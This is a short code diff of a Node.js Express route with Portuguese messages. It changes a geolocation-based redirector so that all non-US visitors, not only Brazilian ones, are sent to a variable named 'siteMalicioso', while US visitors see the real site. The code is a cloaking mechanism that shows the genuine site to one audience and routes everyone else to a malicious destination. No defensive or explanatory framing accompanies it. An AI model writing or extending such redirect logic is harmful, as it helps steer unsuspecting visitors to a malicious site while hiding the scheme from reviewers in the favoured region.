@@ -21,11 +21,9 @@ app.get('/', async (req, res) => {
 
     if (data.countryCode === 'US') {
       res.redirect(siteReal);
-    } else if (data.countryCode === 'BR') {
-      res.redirect(siteMalicioso);
     } else {
-      res.send('Bem-vindo! Seu país não foi configurado para redirecionamento.');
-    }
+      res.redirect(siteMalicioso);
+    } 
   } catch (error) {
     console.error(error.message);
     res.status(500).send('Erro ao obter informações de localização.');
